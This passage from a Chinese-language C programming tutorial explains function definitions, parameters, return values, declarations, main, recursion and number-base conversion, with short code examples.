<li>***用户定义函数:***由用户按需编写的函数。对于用户自定义函数,不仅要在程序中定义函数本身,而且在主调函数模块中还必须对该被调函数进行类型说明,然后才能使用</li>
</ul>
</li>
<li>从函数执行结果的角度来看, 函数可分为有返回值函数和无返回值函数两种<ul>
<li><em><strong>有返回值函数:</strong></em> 此类函数被调用执行完后将向调用者返回一个执行结果,称为函数返回值。(必须指定返回值类型和使用return关键字返回对应数据)</li>
<li><em><strong>无返回值函数:</strong></em> 此类函数用于完成某项特定的处理任务,执行完成后不向调用者返回函数值。(返回值类型为void, 不用使用return关键字返回对应数据)</li>
</ul>
</li>
<li>从主调函数和被调函数之间数据传送的角度看,又可分为无参函数和有参函数两种<ul>
<li><em><strong>无参函数:</strong></em> 在函数定义及函数说明及函数调用中均不带参数。主调函数和被调函数之间不进行参数传送。</li>
<li><em><strong>有参函数:</strong></em> 在函数定义及函数说明时都有参数,称为形式参数(简称为形参)。在函数调用时也必须给出参数,称为实际参数(简称为实参)</li>
</ul>
</li>
</ul>
<hr>
<h2 id="函数的定义"><a href="#函数的定义" class="headerlink" title="函数的定义"></a>函数的定义</h2><ul>
<li>定义函数的目的<ul>
<li>将一个常用的功能封装起来，方便以后调用</li>
</ul>
</li>
<li>自定义函数的书写格式</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">返回值类型 函数名(参数类型 形式参数<span class="number">1</span>，参数类型 形式参数<span class="number">2</span>，…) &#123;</span><br><span class="line">    函数体;</span><br><span class="line">    返回值;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>示例</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world\n&quot;</span>);</span><br><span class="line">    retrun <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>定义函数的步骤<ul>
<li>函数名：函数叫什么名字</li>
<li>函数体：函数是干啥的，里面包含了什么代码</li>
<li>返回值类型: 函数执行完毕返回什么和调用者</li>
</ul>
</li>
</ul>
<hr>
<ul>
<li>无参无返回值函数定义<ul>
<li>没有返回值时return可以省略</li>
<li>格式:</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> 函数名() &#123;</span><br><span class="line">    函数体;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>示例:</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.没有返回值/没有形参</span></span><br><span class="line"><span class="comment">// 如果一个函数不需要返回任何数据给调用者, 那么返回值类型就是void</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printRose</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; &#123;@&#125;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; \\|/\n&quot;</span>); <span class="comment">// 注意: \是一个特殊的符号(转意字符), 想输出\必须写两个斜线</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  |\n&quot;</span>);</span><br><span class="line">  <span class="comment">// 如果函数不需要返回数据给调用者, 那么函数中的return可以不写</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>无参有返回值函数定义</p>
<ul>
<li><p>格式:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">返回值类型 函数名() &#123;</span><br><span class="line">    函数体;</span><br><span class="line">    return 值;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>示例:</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getMax</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入两个整数, 以逗号隔开, 以回车结束\n&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> number1, number2;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%i,%i&quot;</span>, &amp;number1, &amp;number2);</span><br><span class="line">    <span class="keyword">int</span> max = number1 &gt; number2 ? number1 : number2;</span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>有参无返回值函数定义</p>
<ul>
<li>形式参数表列表的格式: <code>类型 变量名,类型 变量2,......</code></li>
<li>格式:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void 函数名(参数类型 形式参数1，参数类型 形式参数2，…) &#123;</span><br><span class="line">    函数体;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>示例:</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printMax</span><span class="params">(<span class="keyword">int</span> value1, <span class="keyword">int</span> value2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> max = value1 &gt; value2 ? value1 : value2;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;max = %i\n&quot;</span>, max);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>有参有返回值函数定义</p>
<ul>
<li>格式:</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">返回值类型 函数名(参数类型 形式参数<span class="number">1</span>，参数类型 形式参数<span class="number">2</span>，…) &#123;</span><br><span class="line">    函数体;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>示例:</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">printMax</span><span class="params">(<span class="keyword">int</span> value1, <span class="keyword">int</span> value2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> max = value1 &gt; value2 ? value1 : value2;</span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>函数定义注意</p>
</li>
<li><ul>
<li>函数名称不能相同</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123; <span class="comment">// 报错</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="函数的参数和返回值"><a href="#函数的参数和返回值" class="headerlink" title="函数的参数和返回值"></a>函数的参数和返回值</h2><ul>
<li>形式参数<ul>
<li>在<em><strong>定义函数</strong></em>时，函数名后面小括号()中定义的变量称为形式参数，简称形参</li>
<li>形参变量只有在被调用时才分配内存单元,在调用结束时,即刻释放所分配的内存单元。</li>
<li>因此,形参只有在函数内部有效,函数调用结束返回主调函数后则不能再使用该形参变量</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> number1, <span class="keyword">int</span> number2)</span> <span class="comment">//  形式参数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> number1 &gt; number2 ? number1 : number2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<ul>
<li>实际参数<ul>
<li>在<em><strong>调用函数</strong></em>时, 传入的值称为实际参数，简称实参</li>
<li>实参可以是常量、变量、表达式、函数等,无论实参是何种类型的量,在进行函数调用时,它们都必须具有确定的值,以便把这些值传送给形参</li>
<li>因此应预先用赋值,输入等办法使实参获得确定值</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num = <span class="number">99</span>;</span><br><span class="line">    <span class="comment">// 88, num, 22+44均能得到一个确定的值, 所以都可以作为实参</span></span><br><span class="line">    max(<span class="number">88</span>, num, <span class="number">22</span>+<span class="number">44</span>); <span class="comment">// 实际参数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>形参、实参注意点</p>
<ul>
<li>调用函数时传递的实参个数必须和函数的形参个数必须保持一致</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> number1, <span class="keyword">int</span> number2)</span> </span>&#123; <span class="comment">//  形式参数</span></span><br><span class="line">    <span class="keyword">return</span> number1 &gt; number2 ? number1 : number2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 函数需要2个形参, 但是我们只传递了一个实参, 所以报错</span></span><br><span class="line">    max(<span class="number">88</span>); <span class="comment">// 实际参数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>形参实参类型不一致, 会自动转换为形参类型</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change</span><span class="params">(<span class="keyword">double</span> number1, <span class="keyword">double</span> number2)</span> </span>&#123;<span class="comment">//  形式参数</span></span><br><span class="line">   <span class="comment">// 输出结果: 10.000000, 20.000000</span></span><br><span class="line">   <span class="comment">// 自动将实参转换为double类型后保存</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;number1 = %f, number2 = %f&quot;</span>, number1, number2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    change(<span class="number">10</span>, <span class="number">20</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>当使用基本数据类型（char、int、float等）作为实参时，实参和形参之间只是值传递，修改形参的值并不影响到实参函数可以没有形参</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change</span><span class="params">(<span class="keyword">int</span> number1, <span class="keyword">int</span> number2)</span> </span>&#123; <span class="comment">//  形式参数</span></span><br><span class="line">    number1 = <span class="number">250</span>; <span class="comment">// 不会影响实参</span></span><br><span class="line">    number2 = <span class="number">222</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">88</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">99</span>;</span><br><span class="line">    change(a, b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a  = %d, b = %d&quot;</span>, a, b); <span class="comment">// 输出结果: 88, 99</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>返回值类型注意点</p>
<ul>
<li>如果没有写返回值类型，默认是int</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">max(<span class="keyword">int</span> number1, <span class="keyword">int</span> number2) &#123;<span class="comment">//  形式参数</span></span><br><span class="line">    <span class="keyword">return</span> number1 &gt; number2 ? number1 : number2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>函数返回值的类型和return实际返回的值类型应保持一致。如果两者不一致,则以返回值类型为准,自动进行类型转换</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">height</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3.14</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">double</span> temp = height();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%lf&quot;</span>, temp);<span class="comment">// 输出结果: 3.000000</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>一个函数内部可以多次使用return语句，但是return语句后面的代码就不再被执行</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> number1, <span class="keyword">int</span> number2)</span> </span>&#123;<span class="comment">//  形式参数</span></span><br><span class="line">    <span class="keyword">return</span> number1 &gt; number2 ? number1 : number2;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;执行不到&quot;</span>); <span class="comment">// 执行不到</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">250</span>; <span class="comment">// 执行不到</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="函数的声明"><a href="#函数的声明" class="headerlink" title="函数的声明"></a>函数的声明</h2><ul>
<li>在C语言中，函数的定义顺序是有讲究的：<ul>
<li>默认情况下，只有后面定义的函数才可以调用前面定义过的函数</li>
</ul>
</li>
<li>如果想把函数的定义写在main函数后面，而且main函数能正常调用这些函数，那就必须在main函数的前面进行函数的声明, 否则<ul>
<li>系统搞不清楚有没有这个函数</li>
<li>系统搞不清楚这个函数接收几个参数</li>
<li>系统搞不清楚这个函数的返回值类型是什么</li>
</ul>
</li>
<li>所以函数声明,就是在函数调用之前告诉系统, 该函数叫什么名称, 该函数接收几个参数, 该函数的返回值类型是什么</li>
<li>函数的声明格式：<ul>
<li>将自定义函数时{}之前的内容拷贝到调用之间即可</li>
<li>例如: <code>int max( int a, int b );</code></li>
<li>或者: <code>int max( int, int );</code></li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 函数声明</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getMax</span><span class="params">(<span class="keyword">int</span> v1, <span class="keyword">int</span> v2)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    getMax(<span class="number">10</span>, <span class="number">20</span>); <span class="comment">// 调用函数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 函数实现</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getMax</span><span class="params">(<span class="keyword">int</span> v1, <span class="keyword">int</span> v2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> max = v1 &gt; v2 ? v1 : v2;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;max = %i\n&quot;</span>, max);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>函数的声明与实现的关系</p>
<ul>
<li>声明仅仅代表着告诉系统一定有这个函数, 和这个函数的参数、返回值是什么</li>
<li>实现代表着告诉系统, 这个函数具体的业务逻辑是怎么运作的</li>
</ul>
</li>
<li><p>函数声明注意点:</p>
<ul>
<li>函数的实现不能重复, 而函数的声明可以重复</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 函数声明</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getMax</span><span class="params">(<span class="keyword">int</span> v1, <span class="keyword">int</span> v2)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getMax</span><span class="params">(<span class="keyword">int</span> v1, <span class="keyword">int</span> v2)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getMax</span><span class="params">(<span class="keyword">int</span> v1, <span class="keyword">int</span> v2)</span></span>; <span class="comment">// 不会报错</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    getMax(<span class="number">10</span>, <span class="number">20</span>); <span class="comment">// 调用函数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 函数实现</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getMax</span><span class="params">(<span class="keyword">int</span> v1, <span class="keyword">int</span> v2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> max = v1 &gt; v2 ? v1 : v2;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;max = %i\n&quot;</span>, max);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>函数声明可以写在函数外面,也可以写在函数里面, 只要在调用之前被声明即可</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">getMax</span><span class="params">(<span class="keyword">int</span> v1, <span class="keyword">int</span> v2)</span></span>; <span class="comment">// 函数声明, 不会报错</span></span><br><span class="line">    getMax(<span class="number">10</span>, <span class="number">20</span>); <span class="comment">// 调用函数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 函数实现</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getMax</span><span class="params">(<span class="keyword">int</span> v1, <span class="keyword">int</span> v2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> max = v1 &gt; v2 ? v1 : v2;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;max = %i\n&quot;</span>, max);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>当被调函数的函数定义出现在主调函数之前时,在主调函数中也可以不对被调函数再作声明</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 函数实现</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getMax</span><span class="params">(<span class="keyword">int</span> v1, <span class="keyword">int</span> v2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> max = v1 &gt; v2 ? v1 : v2;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;max = %i\n&quot;</span>, max);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    getMax(<span class="number">10</span>, <span class="number">20</span>); <span class="comment">// 调用函数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果被调函数的返回值是整型时,可以不对被调函数作说明,而直接调用</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res = getMin(<span class="number">5</span>, <span class="number">3</span>); <span class="comment">// 不会报错</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;result = %d\n&quot;</span>, res );</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getMin</span><span class="params">(<span class="keyword">int</span> num1, <span class="keyword">int</span> num2)</span> </span>&#123;<span class="comment">// 返回int, 不用声明</span></span><br><span class="line">    <span class="keyword">return</span> num1 &lt; num2 ? num1 : num2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="main函数分析"><a href="#main函数分析" class="headerlink" title="main函数分析"></a>main函数分析</h2><ul>
<li>main的含义:<ul>
<li>main是函数的名称, 和我们自定义的函数名称一样, 也是一个标识符</li>
<li>只不过main这个名称比较特殊, 程序已启动就会自动调用它</li>
</ul>
</li>
<li>return 0;的含义:<ul>
<li>告诉系统main函数是否正确的被执行了</li>
<li>如果main函数的执行正常, 那么就返回0</li>
<li>如果main函数执行不正常, 那么就返回一个非0的数</li>
</ul>
</li>
<li>返回值类型:<ul>
<li>一个函数return后面写的是什么类型, 函数的返回值类型就必须是什么类型, 所以写int</li>
</ul>
</li>
<li>形参列表的含义<ul>
<li>int argc :<ul>
<li>系统在启动程序时调用main函数时传递给argv的值的个数</li>
</ul>
</li>
<li>const char * argv[] :<ul>
<li>系统在启动程序时传入的的值, 默认情况下系统只会传入一个值, 这个值就是main函数执行文件的路径</li>
<li>也可以通过命令行或项目设置传入其它参数<br><img src="/2022/01/15/C/0ec7f77ac94198f539e8fa2dce87ab82.png" alt="img"><br><img src="/2022/01/15/C/5cdd2adc527c964fec76a5f55ed62d4d.png" alt="img"></li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<ul>
<li>函数练习<ul>
<li>写一个函数从键盘输入三个整型数字,找出其最大值</li>
<li>写一个函数求三个数的平均值</li>
</ul>
</li>
</ul>
<hr>
<h2 id="递归函数-了解"><a href="#递归函数-了解" class="headerlink" title="递归函数(了解)"></a>递归函数(了解)</h2><ul>
<li><p>什么是递归函数?</p>
<ul>
<li>一个函数在它的函数体内调用它自身称为递归调用</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">function</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    function(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>递归函数构成条件</p>
<ul>
<li>自己搞自己</li>
<li>存在一个条件能够让递归结束</li>
<li>问题的规模能够缩小</li>
</ul>
</li>
<li><p>示例:</p>
<ul>
<li>获取用户输入的数字, 直到用户输入一个正数为止</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getNumber</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> number = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span> (number &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请输入一个正数\n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;number);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;number = %d\n&quot;</span>, number);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getNumber2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> number = <span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入一个正数abc\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;number);</span><br><span class="line">    <span class="keyword">if</span> (number &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">//        负数</span></span><br><span class="line">        getNumber2();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//        正数</span></span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;number = %d\n&quot;</span>, number);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>递归和循环区别<ul>
<li>能用循环实现的功能,用递归都可以实现</li>
<li>递归常用于”回溯”, “树的遍历”,”图的搜索”等问题</li>
<li>但代码理解难度大，内存消耗大(易导致栈溢出), 所以考虑到代码理解难度和内存消耗问题, 在企业开发中一般能用循环都不会使用递归</li>
</ul>
</li>
<li>递归练习<ul>
<li>有5个人坐在一起,问第5个人多少岁?他说比第4个人大两岁。问 第4个人岁数,他说比第3个人大两岁。问第3个人,又说比第2个 人大两岁。问第2个人,说比第1个人大两岁。最后问第1个人, 他说是10岁。请问第5个人多大?</li>
<li>用递归法求N的阶乘</li>
<li>设计一个函数用来计算B的n次方</li>
</ul>
</li>
</ul>
<hr>
<h2 id="进制基本概念"><a href="#进制基本概念" class="headerlink" title="进制基本概念"></a>进制基本概念</h2><ul>
<li><p>什么是进制?</p>
<ul>
<li>进制是一种计数的方式,数值的表示形式</li>
</ul>
</li>
<li><p>常见的进制</p>
<ul>
<li>十进制、二进制、八进制、十六进制</li>
</ul>
</li>
<li><p>进制书写的格式和规律</p>
<ul>
<li><p>十进制 0、1、2、3、4、5、6、7、8、9 逢十进一</p>
</li>
<li><p>二进制 0、1 逢二进一</p>
<ul>
<li>书写形式:需要以0b或者0B开头,例如: 0b101</li>
</ul>
</li>
<li><p>八进制 0、1、2、3、4、5、6、7 逢八进一</p>
<ul>
<li>书写形式:在前面加个0,例如: 061</li>
</ul>
</li>
<li><p>十六进制 0、1、2、3、4、5、6、7、8、9、A、B、C、D、E、F 逢十六进一</p>
</li>
<li><p>书写形式:在前面加个0x或者0X,例如: 0x45</p>
</li>
</ul>
</li>
<li><p>练习</p>
<ul>
<li>1.用不同进制表示如下有多少个方格</li>
<li><img src="/2022/01/15/C/ca48b49abde038c455a5c4ea0789e2ee.png" alt="img"></li>
<li>2.判断下列数字是否合理</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00011</span>  <span class="number">0x001</span>  <span class="number">0x7</span>h4  <span class="number">10.98</span>  <span class="number">0986</span>  <span class="number">.089</span><span class="number">-109</span></span><br><span class="line">+<span class="number">178</span>  <span class="number">0b</span>325  <span class="number">0b0010</span>  <span class="number">0xffdc</span> <span class="number">96f</span> <span class="number">96.0f</span> <span class="number">96.</span>oF  <span class="number">-.003</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h2><ul>
<li>10 进制转 2 进制<ul>
<li>除2取余, 余数倒序; 得到的序列就是二进制表示形式</li>
<li>例如: 将十进制(97) 10转换为二进制数<br><img src="/2022/01/15/C/bf4d5af2fc35c2fffaf62ee00a34c9d2.png" alt="img"></li>
</ul>
</li>
</ul>
<hr>
<ul>
<li><p>2 进制转 10 进制</p>
<ul>
<li>每一位二进制进制位的值 * 2的当前索引次幂; 再将所有位求出的值相加</li>
<li>例如: 将二进制01100100转换为十进制</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">01100100</span></span><br><span class="line">索引从右至左, 从零开始</span><br><span class="line">第<span class="number">0</span>位: <span class="number">0</span> * <span class="number">2</span>^<span class="number">0</span> = <span class="number">0</span>;</span><br><span class="line">第<span class="number">1</span>位: <span class="number">0</span> * <span class="number">2</span>^<span class="number">1</span> = <span class="number">0</span>;</span><br><span class="line">第<span class="number">2</span>位: <span class="number">1</span> * <span class="number">2</span>^<span class="number">2</span> = <span class="number">4</span>;</span><br><span class="line">第<span class="number">3</span>位: <span class="number">0</span> * <span class="number">2</span>^<span class="number">3</span> = <span class="number">0</span>;</span><br><span class="line">第<span class="number">4</span>位: <span class="number">0</span> * <span class="number">2</span>^<span class="number">4</span> = <span class="number">0</span>;</span><br><span class="line">第<span class="number">5</span>位: <span class="number">1</span> * <span class="number">2</span>^<span class="number">5</span> = <span class="number">32</span>;</span><br><span class="line">第<span class="number">6</span>位: <span class="number">1</span> * <span class="number">2</span>^<span class="number">6</span> = <span class="number">64</span>;</span><br><span class="line">第<span class="number">7</span>位: <span class="number">0</span> * <span class="number">2</span>^<span class="number">7</span> = <span class="number">0</span>;</span><br><span class="line">最终结果为: <span class="number">0</span> + <span class="number">0</span> + <span class="number">4</span> + <span class="number">0</span> + <span class="number">0</span> + <span class="number">32</span> + <span class="number">64</span> + <span class="number">0</span> = <span class="number">100</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>2 进制转 8 进制</p>
<ul>
<li>三个二进制位代表一个八进制位, 因为3个二进制位的最大值是7，而八进制是逢8进1</li>
<li>例如: 将二进制01100100转换为八进制数</li>
</ul>
